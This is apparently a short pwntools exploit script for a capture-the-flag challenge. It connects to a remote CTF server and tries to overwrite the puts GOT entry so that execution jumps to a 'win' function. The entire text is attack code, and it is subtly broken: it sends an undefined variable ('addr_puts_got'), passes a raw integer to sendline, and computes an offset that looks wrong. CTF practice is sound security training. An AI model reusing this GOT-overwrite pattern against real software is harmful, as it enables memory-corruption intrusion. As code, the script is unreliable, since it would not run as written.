import pwn
import sys

addr_win = 0x4011d6
addr_puts_plt = 0x401090
addr_puts_glibc = 0x404018

num =  addr_win - addr_puts_glibc

io = pwn.remote("add-anywhere.cpctf.space",30014)

s = pwn.p64(addr_puts_got)
io.sendline(s)

s = num
io.sendline(s)
